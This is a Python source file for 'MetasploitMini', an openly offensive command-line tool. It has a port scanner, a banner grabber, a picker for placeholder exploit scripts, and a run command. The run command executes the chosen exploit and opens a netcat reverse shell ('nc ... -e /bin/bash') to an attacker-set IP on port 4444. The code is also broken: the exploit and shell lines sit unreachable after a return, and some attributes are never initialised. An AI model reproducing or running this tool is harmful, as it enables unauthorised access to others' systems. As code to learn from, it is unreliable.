import cmd
import socket
import os
import pyfiglet

banner = pyfiglet.figlet_format("MetasploitMini")
print(banner)
print("Made by: Tommaso Bona")
print("Github: https://github.com/ParzivalHack")
print("Tip: try running the 'help' command.")

class MyCLI(cmd.Cmd):
    prompt = "MetasploitMini~$ "
    
    def __init__(self):
        super().__init__()
        self.target = ""
      
    def  do_help(self, arg):
    	print("Commands List:")
    	print("- help, to show this help message")
    	print("- settarget, to set a global target")
    	print("- scan, to use the Port Scanner")
    	print("- banner, to use the Banner Grabber")
    	print("- setexploit, to set a global exploit")
    	print("- setip, to set the attacker IP for the reverse shell")
    	print("- run, to run an exploit")
    	print("- exit, to exit MetasploitMini")
    	
    def do_setip(self, arg):
        self.attacker_ip = arg
        print(f"Attacker IP set to {self.attacker_ip}")	
    
    def do_scan(self, arg):
        if not self.target:
            print("Target not set. Use 'settarget <target>' to set the target IP or website.")
            return
        
        args = arg.split()
        if len(args) < 1:
            print("Usage: scan <port range>")
            return
        start_port, end_port = args[0].split("-")
        start_port = int(start_port)
        end_port = int(end_port)
        
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                print(f"Port {port} is open")
            sock.close()
            
    def do_banner(self, arg):
        if not self.target:
            print("Target not set. Use 'settarget <target>' to set the target IP or website.")
            return
        
        args = arg.split()
        if len(args) < 1:
            print("Usage: banner <port>")
            return
        port = int(args[0])
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target, port))
        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        response = sock.recv(1024)
        print(f"Banner: {response.decode('utf-8')}")
        sock.close()
        
    def do_setexploit(self, arg):
        exploits = ["exploit1.py", "exploit2.py", "exploit3.py", "exploit4.py", "exploit5.py"]
        args = arg.split()
        if len(args) < 1:
            print("Usage: setexploit <exploit number>")
            return
        exploit_num = int(args[0])
        if exploit_num < 1 or exploit_num > len(exploits):
            print("Invalid exploit number")
            return
        self.exploit = exploits[exploit_num-1]
        print(f"Exploit set to {self.exploit}")

    def do_run(self, arg):
        if not self.target:
            print("Target not set. Use 'settarget <target>' to set the target IP or website.")
            return
        if not self.exploit:
        	print("Exploit not set. Use 'setexploit <exploit number>' to set the exploit.")
        	return
        	os.system(f"python {self.exploit}")
        	os.system(f"nc -nv {self.attacker_ip} 4444 -e /bin/bash") 
        
    def do_settarget(self, arg):
        self.target = arg
        print(f"Target set to {self.target}")
        
    def do_exit(self, arg):
        return True

if __name__ == "__main__":
    cli = MyCLI()
    cli.cmdloop()
